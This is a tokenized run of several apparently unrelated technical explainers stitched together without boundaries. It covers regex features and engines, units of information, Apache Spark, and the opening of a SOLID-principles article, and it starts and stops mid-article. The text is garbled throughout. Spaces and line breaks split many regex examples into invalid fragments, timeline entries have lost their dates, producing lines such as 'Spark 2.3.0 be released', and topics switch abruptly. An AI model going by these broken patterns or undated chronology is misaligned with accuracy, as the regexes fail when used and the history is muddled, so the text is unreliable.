However , if a hyphen occurs without either start or end , such as ` [ -6 ] ` , it 's interpreted literally .
Likewise , other characters are interpreted literally within a character class .
This is therefore an alternative to escaping with a backslash .
What are regex groups and how are they useful ?
Parts of a regex can be grouped within parentheses , ` ( ) ` .
A quantifier can be applied to an entire group .
Thus , ` ab+ ` will match ' abb ' but ` ( ab)+ ` will match ' ab ' and ' abab ' but not ' abb ' .
Groups are also useful to restrict alternation .
Thus , ` cat|dogs ` will match either ' cat ' or ' dogs ' but ` ( cat|dog)s ` will match either ' cats ' or ' dogs ' .
Groups are generally of three types : Numbered Capturing Group : Each group within a regex is given a number starting from 1 .
The number 0 is reserved for the entire regex .
This number can later be used within the regex for subsequent matches or in a replacement string .
These are called backreferences .
Named Capturing Group : First introduced in Python , naming the groups makes it easier to backreference .
For example , we match one or more digits into a named group called ' score ' using ` ( ?
P&lt;score&gt;\d+ ) ` and backreference it as ` ( ?
P = score ) ` .
Non - Capturing Group : Sometimes we wish to match a group but we 're not going to backreference it later .
Therefore , there 's no need to capture the group .
For example , here we match one or more word characters without capture , ` ( ?
: \w+ ) ` .
Could you explain the concepts of lookahead and lookbehind in regex ?
Illustrating regex lookaround assertions .
Source : Adapted from Jain 2017 , slide 16 .
Sometimes we wish to match a string , but only if it occurs in a certain context .
For example , we wish to match all dark versions of colours that start with ' g ' : darkgreen , darkgrey , darkgray , etc .
While ` dark(g[a - z]+ ) ` will do the job , an alternative is to match the base colour and look behind to see if it 's dark : ` ( ?
< = dark)g[a - z+ ] ` .
The full match will return only the colour without the ' dark ' prefix .
Looking before or after a particular match is called lookaround assertion .
It 's called an assertion because it does n't consume characters from the input .
They only declare if there 's a match or not .
We illustrate examples of the four lookaround assertions : Positive lookahead : Match ' q ' that 's followed by ' u ' , ` q(?=u ) ` .
Negative lookahead : Match ' q ' that 's not followed by ' u ' , ` q(?!u ) ` .
Positive lookbehind : Match ' b ' that follows ' a ' , ` ( ?
< = a)b ` .
Negative lookbehind : Match ' b ' that does n't follow ' a ' , ` ( ?
< !
a)b ` .
What are some other advanced regex features ?
Some advanced regex features include the following : Laziness : A regex such as ` .
* , ` is greedy .
It will match as many characters as possible preceding a comma .
A lazy or non - greedy match is achieved using ' ?
' , such as ` .
* ?
, ` .
This will match only till the first comma .
Possessive Quantifier : Using ' + ' , such as ` .*+ ` , we can tell the regex engine to avoid unnecessary backtracking .
This can be seen as a notational convenience for atomic groups .
Atomic Grouping : These are special non - capturing groups to prevent unnecessary backtracking .
The use of atomic grouping improves performance .
An example of this is ` ( ?
> his|this ) ` .
If ' his ' is not present , obviously we do n't need to backtrack and look for ' this ' .
Conditionals : We can use lookaround assertions for specifying conditions .
Depending on condition 's result ( true or false ) , other parts of the regex can be processed .
Recursion : Use ` ( ?
R ) ` to match nested constructs .
Do regular expressions differ across programming languages ?
Regular expressions are processed by regex engines , of which there are many flavours .
A programming language typically adopts one of these engines .
Differences across these flavours are not easy to remember .
Programmers should be aware that migrating regex from one engine to another must be accompanied by proper testing .
Some of these flavours include JGsoft , .NET , Perl , PHP , R , JavaScript , Python , Tcl ARE , POSIX BRE , POSIX ERE , GNU BRE and GNU ERE .
The oldest of these is the Basic Regular Expression ( BRE ) that has limited power and expressiveness .
BRE was later extended to the Extended Regular Expression ( ERE ) .
To study how these various engines differ , take a look at Roger Qiu 's comparison chart or Wikipedia 's entry .
As an example , Sed tool uses BRE by default , where ` + ` matches literal plus sign .
But with option -E it uses ERE , where ` \+ ` must be used for literal match .
Since Perl popularized regex , one of the popular engines that came about is called Perl Compatible Regular Expression ( PCRE ) .
The PCRE was later updated to PCRE2 .
PCRE and its variants have been adopted by many programming languages .
What are some tips or best practices for using regex ?
For readable and maintainable regex , use the flag ` x ` to ignore whitespace .
Thus , a complex regex can be expanded with useful comments .
To find the match in the right place , use anchors .
The use of ` .
* ` can make the engine backtrack often .
Construct a more specific regex .
Likewise , the use of lazy quantifiers ` { .
* ?
} ` can be inefficient .
Instead , say what you do n't want to match , ` { [ ^ } ] * } ` .
Also , atomic groups can save on backtracking .
However , lazy quantifiers can be better in some simple scenarios : ` * ?
's ` is faster than ` * 's ` .
Regex must be designed to fail fast .
For example , ` ( ?
= .*fleas ) .
* ` does a lot of backtracking on lines that do n't contain ' fleas ' .
On the other hand , ` ^(?=.*fleas ) .
* ` has a lookahead anchored at the start of the string and will fail faster .
Use contrast , that is , what characters to match and what not to match .
For example , to match ' ABC123 ' the regex ` ^.+\d{3}$ ` wo n't work since ` .
` and ` \d ` are not mutually exclusive .
Instead , use ` ^\D+\d{3}$ ` .
When using alternations ( use of ` | ` ) , put the more common patterns earlier .
Where should I not use regular expressions ?
While regex is useful , it can be overused and abused .
An extreme example is a 6343-character long regex to match an email address .
Here 's a quote from 1997 , attributed to Jamie Zawinski , Some people , when confronted with a problem , think " I know , I 'll use regular expressions .
" Now they have two problems .
While URL paths and email addresses can be parsed using regex , there are dedicated and mature libraries to do these .
You should prefer to use them instead .
Regex is also not the best choice for parsing HTML or code since there are better tools to generate tokenized outputs .
Humans write in a number of different ways .
A regex will not adequately capture all the different variations .
In general , when code is read and maintained by many developers , complex regex will be problematic .
Regex is generally not descriptive enough to match balanced parenthesis , such as , ` ( aa ( bbb ) ( bbb ) aa ) ` .
Could you point me to useful resources for working with regex ?
Debuggex helps in visualizing your regex .
Source : Debuggex 2019 .
Among the places to learn regex are RegexOne , RexEgg , Regex Crossword and Jan Goyvaerts ' Regular - Expressions.info .
Beginners might like Net Ninja 's series of sixteen videos on regex .
For absolute basics , consider reading Mike Malone 's blog post from 2007 .
A classic book on regex is Mastering Regular Expressions by Jeffrey Friedl .
Another good book is Regular Expressions Cookbook by Jan Goyvaerts and Steven Levithan .
Dave Child has published a handy regex cheatsheet .
There are many websites that help with debugging and visualizing regex patterns and their matches .
A few recommended ones include Regex101 , Debuggex and RegExr .
These typically support multiple regex flavours .
Regex Storm is special for .NET regex flavour ; Rubular is for Ruby regex .
You can also read a comparison of some online regex testers .
Mathematician Stephen Cole Kleene coins the term regular expressions as a notation for expressing the algebra of regular sets .
The regex metacharacter ` * ` is named Kleene Star in his honour .
Ken Thompson at Bell Labs writes a new version of QED text editor for the MIT CTSS system .
He introduces regular expressions to QED , thus bringing regex from the world of mathematics to computer science for the first time .
Regex in QED is also compiled on the fly , for which Thompson received a US patent .
In this decade , regex has made its way into some Unix programs and utilities such as sed , awk and grep .
It 's been said that AWK is the first language to make regex a first class programming construct .
In 1975 , Al Aho created the Egrep command with a much more expressive syntax than the basic one supported by Grep .
Henry Spencer expands the regex syntax and provides an engine for the same .
His regex library could be freely included in other programs .
He later went on to create an even better regex engine for Tcl .
POSIX character classes are mapped to equivalent regex .
Source : Goyvaerts 2018d .
IEEE defines POSIX BRE and POSIX ERE as part of the standard IEEE Std 1003.1 - 1992 .
Philip Hazel releases the PCRE regex library .
This was later adopted by PHP , Apache and many others .
This follows the syntax and semantics of Perl5 .
In 2015 , PCRE2 will be released .
In the 1990s , Larry Wall , the creator of Perl , adopts and expands Spencer 's library .
Perl 5.005 was released in 1998 and it includes enhancements to the regex engine .
Perl 's innovation on regex include lazy quantifiers , non - capturing parentheses , inline mode modifiers , lookahead , and a readability mode .
ColdFusion , Java , JavaScript , the .NET Framework , PHP , Python , and Ruby are some of the languages that have since adopted Perl 's regex syntax and features .
A regular expression describes a search pattern that can be applied to textual data to find matches .
A regex is typically compiled to a form that can be executed efficiently on a computer .
The actual search operation is performed by the regex engine , which makes use of the compiled regex .
To write good regexes , it 's helpful for programmers to know how these engines work .
There are a few types of engines , often implemented as a Finite Automaton .
In fact , regexes are related to Automata Theory and Regular Languages .
The syntax and semantics of regexes have been standardized by IEEE as POSIX BRE and ERE .
However , there are many non - standard variants .
Often , the differences are subtle .
Programmers who design regexes must be aware of the variants being used by the engine .
Is my regex executed directly by a regex engine ?
Regex execution model .
Source : Devopedia .
A regex engine receives two inputs : the regex pattern plus the input string .
Programmers specify regexes as strings .
While an engine could be designed to work with strings directly , there 's a better and more efficient way .
It 's been shown that for every regex there 's an equivalent Finite State Machine ( FSM ) or Finite Automaton ( FA ) .
In other words , the regex can be modelled as a finite set of states and transitions among these states based on inputs received at a state .
Therefore , the job of a compiler is to take the original regex string and compile it into a finite automaton , which can be more easily executed by the engine .
In some implementations , a preprocessor may be invoked before the compiler .
This substitutes macros or character classes , such as , replacing ` \p{Alpha } ` with ` [ a - zA - Z ] ` .
A preprocessor also does locale - specific substitutions .
Let 's note that there 's no standard definition of what a regex engine is .
Some may consider parsing , compiling and execution as part of the engine .
Could you explain how automata theory is applied to regexes ?
Comparing DFA and NFA for regex ' abb*a ' .
Source : Adapted from Kyashif 2019 .
There are two types of automata : Deterministic Finite Automaton ( DFA ) : Given a state and an input , there 's a well - defined output state .
Non - Deterministic Finite Automaton ( NFA ) : Given a state and an input , there could be multiple possible output states .
A variant of NFA is ε - NFA , where a state transition can happen even without an input .
It 's been proven that every DFA can be converted to an NFA , and vice versa .
In the accompanying figure , all three automata are equivalent and represent the regex ` abb*a ` ( or ` ab+a ` ) .
For NFA , when ' b ' is received in state q1 , the automaton can remain in q1 or move to q2 .
Thus , it 's non - deterministic .
For ε - NFA , the automaton can move from q2 to q1 even without an input .
It 's been said , regular expressions can be thought of as a user - friendly alternative to finite automata for describing patterns in text .
What are the different types of regex engines ?
Regex engines could be implemented as DFA or NFA .
However , in simpler languages , a regex engine can be classified as follows : Text - Directed : Engine attempts all paths of the regex before moving to the next character of input .
Thus , this engine does n't backtrack .
Since all paths are attempted at once , it will return the longest match .
For example , ` ( Set|SetValue ) ` on input " SetValue " will match " SetValue " .
Regex - directed : If the engine fails at a position , it backtracks to attempt an alternative path .
Paths are attempted in left - to - right order .
Thus , it returns the leftmost in matches even if there 's a longer match in another path later .
For example , ` ( Set|SetValue ) ` on input " SetValue " will match " Set " .
Most modern engines are regex - directed because this is the only way to implement useful features such as lazy quantifiers and backreferences ; and atomic grouping and possessive quantifiers that give extra control to backtracking .
Today 's regexes are feature rich and ca n't always be implemented efficiently as an automaton .
Lookaround assertions and backreferences are hard to implement as NFA .
Most regex engines use recursive backtracking instead .
How do the different regex engines compare ?
Different engine types and their adoption .
Source : Friedl 2006 , ch .
4 .
With recursive backtracking , pathological regexes result in lots of backtracking and searching for alternative paths .
The time complexity grows exponentially .
Thompson 's NFA ( or its equivalent DFA ) is more efficient and maintains linear - time complexity .
A compromise is to use the Thompson algorithm and backtrack only when needed for backreferences .
GNU 's awk and grep tools use DFA normally and switch to NFA when backreferences are used .
Ruby uses non - recursive backtracking but this too grows exponentially for pathological regexes .
Ruby 's engine is called Oniguruma .
The DFA is more efficient than the NFA since the automaton is in only one state at any given time .
A traditional NFA tries every path before failing .
A POSIX NFA tries every path to find the longest match .
A text - directed DFA spends more time and memory analyzing and compiling the regex but this could be optimized to compile on the fly .
In terms of code size , the NFA regex in ed ( 1979 ) was about 350 lines of C code .
Henry Spencer 's 1986 implementation was 1900 lines and his 1992 POSIX DFA was 4500 lines .
What are the essential rules that a regex engine follows ?
A regex engine executes the regex one character at a time in left - to - right order .
This input string itself is parsed one character at a time , in left - to - right order .
Once a character is matched , it 's said to be consumed by the input , and the engine moves to the next input character .
The engine is by default greedy .
When quantifiers ( such as ` * + ?
{ m , n } ` ) are used , it will try to match as many characters from the input string as possible .
The engine is also eager , reporting the first match it finds .
If the regex does n't match a character in the input , it does two things .
It will backtrack to an earlier greedy operation and see if a less greedy match will result in a match .
Otherwise , the engine will move to the next character and attempt to match the regex all over again at this position .
Either way , the engine always knows its current position within the regex .
If the regex specifies alternatives , if one search path fails , the engine will backtrack to match the next alternative .
Therefore , the engine also stores backtracking positions .
Could you explain the concepts " greedy " and " eager " with examples ?
Take regex ` a.*o ` on input " cat dog mouse " .
Even though " at do " is a valid match , since the engine is greedy , the match it gives is " at dog mo " .
To avoid this greedy behaviour , we can use a lazy or non - greedy match : ` a.*?o ` will match " at do " .
Ungreedy match in some flavours such as PCRE can be specified using the ' U ' flag .
A non - greedy ` \w{2,3 } ?
` on input , " abc " will match " ab " rather than " abc " .
Suppose the regex is ` \w{2,3}?$ ` , then the match is " abc " and not " bc " , even though the regex is non - greedy .
This is because the engine is eager to report the first match it finds .
Thus , it first matches " ab " , then sees that ` $ ` does n't match " c " .
At this point , the engine will not backtrack to position " b " .
It will remain at " a " and compare the third character due to ` { 2,3 } ` .
Thus , it finds " abc " as match .
It eagerly reports this match .
Another example is ` ( self)?(selfish ) ?
` applied on input " selfish " .
Because of eagerness , the engine will report " self " as the match .
However , a text - directed engine will report " selfish " .
Could you explain backtracking with an example ?
Five backtracks to start of regex before a match .
Source : Devopedia .
Let 's take the regex ` /-\d+$/g ` and input string " 212 - 244 - 7688 " .
The regex engine will match ` -\d+ ` to " -244 " but when it sees ` $ ` it declares no match .
At this point , it will backtrack to the start of the regex and the current position in the input string will advance from " - " to " 2 " .
In this example , only one backtracking happens .
Suppose we apply ` /\d-\d+$/g ` on the same input , we 'll have five backtracks as shown in the figure .
The engine can also backtrack part of the way .
Let 's apply ` /A\d+\D?./g ` to " A1234 " .
The engine will match ` A\d+\D ?
` to " A1234 " but when it sees ` .
` There 's no match .
It will backtrack to ` \d+ ` and give up one character so that ` A\d+ ` now matches only " A123 " .
As the engine continues , it will match ` .
` with " 4 " .
Another example of backtracking is ` pic(ket|nic ) ` .
If the string is " Let 's picnic .
" , the engine will match ` pic ` to " pic " but will fail in the next character match ( k vs. n ) .
The engine knows there 's an alternative .
It will backtrack to the end of the ` pic ` and process the second alternative .
Illustrating conversion of NFA to DFA .
Source : Adapted from Maccaferri 2009 .
Michael Rabin and Dana Scott introduce the concept of non - determinism .
They show that an NFA can be simulated by a DFA in which each DFA state corresponds to a set of NFA states .
Ken Thompson shows in an ACM paper how a regex can be converted to an NFA .
He presents an engine that can track alternative paths in the NFA simultaneously .
This is now called Thompson NFA .
For a regex of length m and input of length n , Thompson NFA requires \(O(mn)\ ) time .
In comparison , the backtracking regex implementation requires \(O(2^n)\ ) time when there are n alternative paths .
An NFA can be built from simple operations ( such as concatenation , alternation , looping ) on partial NFAs .
Unix ( First Edition ) appears and ed text editor is one of the programs in it .
The editor uses regex but it 's not Thompson 's NFA but recursive backtracking .
Other utilities , such as Grep ( 1973 ) follow suit .
Unix ( Seventh Edition ) includes egrep , the first utility to support full regex syntax .
It pre - computes the DFA .
By 1985 , it was able to generate the DFA on the fly .
The regexp(3 ) library of Unix ( Eighth Edition ) adapts Thompson 's algorithm to extract submatches or capturing groups .
This work is credited to Rob Pike and Dave Presotto .
This goes unnoticed and is not widely used .
However , a year later , Henry Spencer reimplements the library interface from scratch using recursive backtracking .
This was later adopted by Perl , PCRE , Python , and others .
Henry Spencer writes an engine for TCL version 8.1 .
This is a hybrid engine .
It 's an NFA supporting lookaround and backreferences .
It also returns the longest - leftmost match as specified by POSIX .
Russ Cox provides a 400-line C implementation of Thompson 's NFA .
He shows that for pathological regex , this is a lot faster than common implementations ( recursive backtracking ) used in many languages , including Perl .
Google open sources RE2 that 's based on automata theory , has linear - time complexity and uses a fixed size stack .
Because Google uses regexes for customer - facing tools such as Code Search , backtracking and exponential - time complexity of earlier implementations could lead to Denial - of - Service ( DoS ) attacks .
In addition , recursive backtracking can lead to stack overflows .
Work on RE2 can be traced to the work on Code Search in 2006 .
Information from bit to yottabyte .
Source : Economist 2010 .
We wish to quantify information or data for the purpose of storage or transfer .
This helps us plan the capacity of storage systems or the bandwidth of communication systems .
Service providers also use these numbers to determine pricing .
The basic unit of information is called bit .
It 's a short form for binary digits .
It takes only two values , 0 or 1 .
All other units of information are derived from the bit .
For example , 8 bits is called a byte , which is commonly used .
Since the early 2010s , we have seen a massive growth in the amount of data being generated worldwide .
This has led to the use of higher units such as petabytes and exabytes .
In the world of quantum computing , qubit is the basic unit of information .
What 's the rationale for trying to quantify information ?
A common unit to compare different things .
Source : Khan Academy Labs 2014 .
It 's been said that a picture is worth a thousand words .
In digital systems , this is not a satisfactory statement .
What if there 's a quantitative way to compare information regardless of the form , be it a picture , a movie , printed text or a song ?
Outside the world of digital systems , different units exist .
For a library , the number of books it has on its shelves is an essential metric .
For a printer , the number of pages is more suitable , but this too is not a uniform measure since the page size of a book is different from that of a newspaper .
For a publisher or an author , the number of words is a better way to convey the amount of data .
In digital systems , a common unit makes it easier to design systems regardless of the type of data being handled .
How much storage should you install for a desktop machine ?
How many images can you store on your SD card ?
How long will it take to download a 90-minute full HD movie ?
These questions can be answered more readily .
What are the different units of information ?
Eight bits make a byte or octet .
A thousand bytes makes a kilobyte .
A thousand kilobytes makes a megabyte .
The largest unit we have ( in 2019 ) is a yottabyte , which is \(10^{24}\ ) bytes .
While higher units ( brontobytes , geopbytes , etc .
) have been suggested , they 're not official .
We also have multiples of bits : kilobits , megabits , and so on .
While storage is often quoted in bytes , communication bandwidth is often quoted in bits .
For example , we may say that a file is 300 KB ( kilobytes ) in size ; or a broadband connection gives a maximum of 4Mbps ( megabits per second ) download speed .
Web browsers , however , give download speeds in bytes per second .
Bytes are commonly used .
Each letter of the English alphabet is represented by a byte .
Short emails are on the order of a few hundred bytes .
The typed text of a few pages is a few kilobytes .
An image downloaded on the web could be a few hundred kilobytes .
A song encoded on MP3 is a few megabytes .
A movie is hundreds of megabytes or even a few gigabytes .
In production , the Avatar movie took up 1 petabyte of storage .
What units of information are of concern to a programmer ?
Word is 4 bytes on a 32-bit machine .
Source : Harish 2014 .
The byte is the basic unit of memory or storage for programmers , although bit - level manipulation is possible .
Since a bit can store two values , a byte can store \(2 ^ 8=256\ ) different values .
From the perspective of programming , four bits make a nibble .
It 's common to write a byte value in hexadecimal form of two nibbles .
For example , 126 is 0x7E. These nibbles are also conveniently shown when debugging memory content .
Nibbles were useful in early computer systems that used packed BCD .
Two words make a doubleword but what exactly is a word ?
The length of a word depends on the processor architecture .
In a 16-bit system , a word is defined as two bytes .
In a 64-bit system , a word is eight bytes .
A processor executes instructions , accesses data in memory via addresses , and processes or represents numbers in words or its multiples .
Thus , programmers who write low - level code need to be aware of the word size .
In the C programming language , short must be at least 16 bits ; long at least 32 bits ; and long long at least 64 bits .
How is a kibibyte different from a kilobyte ?
Comparing SI units against IEC units of information .
Source : Ramić 2017 .
The prefixes kilo , mega , giga and others are based on the decimal system in which these are powers of ten .
But computer systems operate on the binary system .
Hence , memory and storage capacities are often quoted as powers of two .
Thus , a kilobyte was 1,024 bytes , not 1,000 bytes .
This led to confusion since these prefixes in the SI metric system commonly referred to powers of ten .
To set right this confusion , the International Electrotechnical Commission ( IEC ) approved in 1998 , and published in 1999 , a new set of units that represented powers of two .
Thus , a kibibyte had 1,024 bytes , a mebibyte had 1,024 kibibytes , and so on .
However , industry has not widely adopted the IEC units .
Thus , Windows 10 continues to report 203 GB disk capacity as 189 GB when it should say 189GiB. What is information related to entropy ?
The word information is often loosely taken to mean data .
We assume that a file 1 MB carries 1 MB of information .
However , from the perspective of information theory , data is not equal to information .
In information theory , information is defined mathematically as the amount of uncertainty or entropy .
A dice throw has more uncertainty than a coin toss , and therefore has more information to convey .
An uncompressed bitmap image has a lot of spatial redundancy in its pixel values .
In other words , a pixel value can be used to predict values of neighbouring pixels .
Image compression techniques exploit this redundancy .
Thus , a compressed image is closer to the mathematical definition of information .
But an MP3 song could contain repetitions of the chorus .
Also , once we 've heard the song and remember it well , it conveys less information the next time we hear it .
Therefore , the phrase " units of information " should be interpreted as " units of data / storage / memory " .
Hartley studies the problem of measuring information .
Given \(s\ ) symbols and \(n\ ) selections , he notes that information \(H = n\,log\,s\ ) .
He describes this as , our practical measure of information , the logarithm of the number of possible symbol sequences . Claude Shannon publishes his paper titled A Mathematical Theory of Communication .
He introduces the word bit as a contraction of a binary digit .
He credits J. W. Tukey for coining this word .
During the design of IBM 7030 Stretch , IBM 's first transistorized supercomputer , Werner Buchholz created the term byte for an ordered collection of bits .
It represents the smallest amount of data that a computer can process .
At this time , the byte is not defined as eight bits .
During this decade , 7-bit ASCII has been standardized .
More importantly , IBM introduced its System/360 product line that uses 8-bit Extended Binary Coded Decimal Interchange Code ( EBCDIC ) .
This leads to the popular use of 8-bit storage systems .
Thus , a byte comes to represent 8 bits .
The prefixes exa and peta are standardized as part of the International System of Units ( SI ) .
The prefixes zetta and yotta are standardized as part of the International System of Units ( SI ) .
Windows 10 uses GB when it should use GiB. Source : Devopedia 2019 .
The International Electrotechnical Commission ( IEC ) publishes new units of information based on powers of two : kibibyte , mebibyte , gibibyte , and so on .
The letters " bi " replace the last two letters of the SI prefixes .
While some systems have adopted these units , many others have not .
When processing large amounts of data , it 's common to distribute and parallelize the workload across a cluster of machines .
Apache Spark is a framework that sits between the applications above and the cluster of resources below .
Spark does n't manage the low - level storage and compute resources directly .
Instead , it makes use of other frameworks such as Mesos or Hadoop .
In fact , Apache Spark is described as " a unified analytics engine for large - scale data processing " .
Applications written in many popular languages can make use of Spark .
Meanwhile , support for more languages is coming .
Since Spark comes with many useful libraries , different types of processing are possible in a single application .
Spark is being popularly used for Machine Learning workloads .
Spark is open source and is managed by Apache Software Foundation .
In which application scenarios is Spark useful ?
Spark use cases from a 2015 survey .
Source : Ramel 2015 .
Hadoop MapReduce is great for batch processing where typically data is read from disk , processed and written back to disk .
But MapReduce is inefficient for multi - pass applications that read more than once .
Performance drops due to data duplication , serialization and disk I / O. Apache Spark was created to solve this and is useful for the following : Iterative Algorithms : This includes machine learning algorithms that , by nature , process data through many iterations .
Interactive Data Mining : Data is loaded into RAM once and then repeatedly queried .
Interactive or ad - hoc analysis often includes visualizations .
The language for querying the data must also be expressive .
Streaming Applications : For real - time analysis , data must be analyzed as it comes into the system .
There 's a need to maintain an aggregate state over time .
Spark can be used in gaming , e - commerce , finance , advertising , and more .
Many of these involve real - time analysis and unstructured data sources .
Uber used Spark for feature aggregation in its ML data pipeline .
Spark can help in scaling data pipelines for genomics .
One researcher analyzed NASA server logs ( ~300 MB ) using database - like queries and regular expressions via Spark .
What makes Spark better than Hadoop MapReduce ?
Performance comparison of MapReduce and Spark .
Source : Rifat 2018 .
Like MapReduce , Spark is scalable , distributed and fault tolerant , but it 's also more efficient and easy to use .
While MapReduce reads and writes to disk between tasks , Spark does in - memory caching and thereby improves performance .
Spark does this by providing a data abstraction called Resilient Distributed Dataset ( RDD ) .
Interfacing to RDD is enhanced with DataFrame and Dataset APIs .
This is just one example of Spark 's better usability via rich APIs and a functional programming model .
MapReduce jobs are executed as JVM processes but Spark is able to execute multiple tasks inside a JVM process .
Another advantage of Spark is that each JVM process lives for the entire duration of the application , unlike in MapReduce where the process exits once execution completes .
This means that new tasks submitted to a Spark cluster can start much faster .
There 's better CPU utilization .
The tradeoff is that resource management is coarse grained but cluster managers can overcome this ( such as YARN 's container resizing ) .
However , MapReduce may still be relevant for linear processing of huge datasets that ca n't fit into memory , particularly for joining operations .
What 's the architecture of Apache Spark ?
Apache Spark architecture .
Source : Apache Spark Docs 2019a .
A Spark application runs in a distributed manner on a cluster of nodes .
It consists of two parts : the main program , called driver program , and executors or processes on worker nodes where actual execution happens .
The Driver program contains the SparkContext object for coordinating the application .
A worker node is any node that runs application code .
Such code could be JAR or Python files , for example .
The Application code available in SparkContext is passed to executors .
SparkContext also schedules and sends tasks to executors .
Each application gets its own executors .
This cleanly isolates one application from another .
Multiple tasks can run within an executor due to multi - threading .
Since the driver program schedules tasks , it should be close to the worker nodes , preferably on the same local area network .
It should also be network addressable from worker nodes and listen for incoming connections .
The driver program connects to a cluster manager that 's responsible for managing resource allocation .
The cluster manager could be anything : Spark 's default manager , Apache Mesos , Hadoop YARN , Kubernetes , etc .
The manager needs to only acquire executor processes and these communicate with one another .
What are some essential terms to know in Apache Spark ?
Transformations and actions on an RDD .
Source : Viswanath 2016 .
Here are some essential terms : Task : A unit of work sent to one executor .
Job : Parallel computation involving multiple spawned tasks for some actions such as ` save ` or ` collect ` .
Stage : A smaller set of tasks for a job , useful when one stage depends on another .
RDD : A fault - tolerant collection of elements that can be processed in parallel .
Partition : A smaller chunk into which an RDD is divided .
A task is launched per partition .
Thus , more partitions imply greater parallelism .
Having 2 - 4 partitions per CPU is typical .
Transformation : An operation performed on an RDD .
Since RDDs are immutable , transformations on an RDD result in a new RDD .
Action : An operation on an RDD that returns the result to the driver program .
What 's the Spark software stack ?
Apache Spark software stack .
Source : Kim and Bengfort 2016 , ch .
4 , fig .
4 - 1 .
The Spark Core is the main programming abstraction .
It allows APIs ( in Java , Scala , Python , SQL , and R ) to access and manipulate RDDs .
To ease development , Spark comes with component libraries including Spark SQL / DataFrame / Dataset , Spark Streaming , MLlib and GraphX. Each of these serves specific application requirements , but they all rely on Spark Core 's unified API .
This approach of a modular core plus useful components makes Spark attractive to developers .
User applications sit on top of these components .
The Spark Shell is an example app that facilitates interactive analysis .
Spark Core itself does n't manage cluster resources .
This is done by a cluster manager .
Spark comes with a standalone cluster manager , but we are free to choose alternatives such as Hadoop YARN , Mesos , Kubernetes , etc .
Spark Core also does n't deal with disk storage for which we can use Hadoop HDFS , Cassandra , HBase , S3 , etc .
For example , in one deployment we could choose to use YARN along with HDFS while the computing is managed via Spark Core .
Researchers at UC Berkeley 's AMPLabs created a cluster management framework called Mesos .
To showcase how easy it is to build something on top of Mesos , they looked at the limitations of MapReduce and Hadoop .
These are good at batch processing but not at iterative or interactive processing , such as machine learning or interactive querying .
To overcome these limitations , they build Spark .
Spark is written in Scala and exposes a functional programming interface .
Spark is open - source .
Its creators published the first paper on Spark , titled Spark : Cluster Computing with Working Sets .
Spark is incubated under the Apache Software Foundation .
In February 2014 , it became a top - level Apache project .
With the Spark 1.4 release , there 's support for both Python 2 and 3 .
However , it was announced later to deprecate Python 2 support in the next major release of 2019 .
Spark 2.0.0 unifies DataFrame and Dataset APIs .
Source : Damji 2016 .
Spark 2.0.0 has been released .
To enable optimization , the DataFrame API was introduced in v1.3 .
The Dataset API introduced in v1.6 enabled compile - time checks .
From v2.0 , Dataset presents a single abstraction although language bindings that do n't have type checks ( Python , R ) will internally use DataFrame , which is an alias for Dataset[Row ] .
In February , Spark 2.3.0 be released .
With this release , native Spark jobs can be managed by Kubernetes .
Data source API V2 improves over V1 .
Meanwhile , a ranking of distributed computing packages for data science shows Apache Spark at the top , followed by Apache Hadoop .
In the enterprise , Apache Spark MLib is most adopted for ML and Big Data analytics .
This is followed by TensorFlow .
For using Spark from C # and F # , .NET for Apache Spark has been launched as a preview project .
Direction will come from .NET Foundation .
This effort replaces and deprecates Mobius .
A summary of the five SOLID principles .
Source : Jayakanth R 2018 .
In the world of object - oriented programming ( OOP ) , there are many design guidelines , patterns and principles .
Five of these principles are usually grouped together and are known by the acronym SOLID .
While each of these five principles describes something specific , they overlap as well , such that adopting one of them implies or leads to adopting another .
Programming in strict conformance to SOLID is generally not expected .
However , programmers must be aware of SOLID and use it depending on the context .
In general , SOLID helps us manage code complexity .
It leads to more maintainable and extensible code .
Even with big change requests , it 's easier to update the code .
What problems are solved or avoided by applying SOLID ?
Software may start with a clean and elegant design , but over time it becomes hard to maintain , often requiring costly redesigns .
Robert Martin , who 's credited with writing down the SOLID principles , points out some symptoms of rotting design due to improperly managed dependencies across modules : Rigidity : Implementing even a small change is difficult since it 's likely to translate into a cascade of changes .
Fragility : Any change tends to break the software in many places , even in areas not conceptually related to the change .
Immobility : We 're unable to reuse modules from other projects or within the same project because those modules have lots of dependencies .
Viscosity : When code changes are needed , developers will prefer the easier route even if they break the existing design .
Antipatterns and improper understanding of design principles can lead to STUPID codes : Singleton , Tight Coupling , Untestability , Premature Optimization , Indescriptive Naming , and Duplication .
SOLID can help developers stay clear of these .
The essence of SOLID is managing dependencies .
This is done via interfaces and abstractions .
Modules and classes should not be tightly coupled together .
As a beginner , what are some things to keep in mind when applying SOLID ?
SOLID is really a guideline and not a rule .
They work in many cases , but they 're not guaranteed to always work .
Just knowing the principles will not turn a bad programmer into a good one .
This means that programmers need to understand why these principles make sense .
They need to apply them with judgement .
If they see a code that violates these principles , they must try to see if the violations can be justified .
If not , they can apply one or more principles to improve the code .
Practice is the key .
Could you explain the Single Responsibility Principle ?
Applying SRP to the Automobile class .
Source : Çapar 2018 .
A class or a module must have a specific responsibility and nothing more .
To put it another way , it should change for only one reason .
We can say that the responsibility is encapsulated within the class and there 's stronger cohesion within the class .
For example , an automobile class can start or stop itself but the task of washing it belongs to the CarWash class .
In another example , a book class has properties to store its own name , author and text .
But the task of printing the book must belong to the BookPrinter class .
The BookPrinter class might print to console or another medium , but such dependencies are removed from the book class .
When SRP is followed , testing is easier .
With a single responsibility , the class will have fewer test cases .
Less functionality also means less dependencies on other modules or classes .
It leads to better code organization since smaller and well - purposed classes are easier to search for .
Could you explain the Open - Closed Principle ?
Use interfaces to conform to OCP .
Source : Hikri 2018 .
It should be possible to extend a module with additional behaviour without modifying it .
This means that functions or base class methods should not get polluted with details of subclasses .
A function that checks object types is a violation of OCP .
This is because when a new object type is added , this function has to be modified to handle the new type .
Abstraction is the key to getting OCP right .
Two possible ways of doing this are polymorphism or templates / generics .
OCP is important since classes may come to us via third - party libraries .
We should be able to extend those classes without worrying if those base classes can support our extensions .
But inheritance can lead to subclasses depending on base class implementation .
To avoid this , the use of interfaces is recommended .
This additional abstraction leads to loose coupling .
For example , a car class might have methods : AccelerateAudi , AccelerateBMW , and so on .
This is a violation of OCP .
Instead , we should have an ICar interface with the method Accelerate .
Each car subclass can implement this interface .
Could you explain the Liskov Substitution Principle ?
TRubberDucky is not exactly a TDuck and violates LSP .
Source : AlignMinds 2015 .
This principle states that we can substitute a subclass for its base class without affecting behaviour .
This avoids misusing inheritance .
It helps us conform to the " is - a " relationship .
We can also say that subclasses must fulfil a contract defined by the base class .
In this sense , it 's related to Design by Contract that was first described by Bertrand Meyer .
